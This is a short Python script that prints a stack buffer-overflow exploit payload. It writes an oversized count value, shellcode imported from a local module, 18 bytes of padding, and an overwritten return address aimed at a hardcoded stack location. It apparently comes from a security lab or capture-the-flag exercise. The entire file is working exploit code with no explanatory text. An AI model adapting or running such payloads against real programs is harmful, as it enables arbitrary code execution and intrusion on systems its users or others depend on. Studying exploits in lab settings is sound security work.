#!/usr/bin/env python3
import sys
from shellcode import shellcode
count = 0xFFFFFFFFFFFFFFFF
sample = 0x7ffffff6b0f8
address = 0x7ffffff6b090
padding = b"\x69" * 18
#temp ='s50+ shellcode + padding + address.to_bytes(8,'little''
sys.stdout.buffer.write(count.to_bytes(8,'little') + shellcode + padding + address.to_bytes(8,'little'))
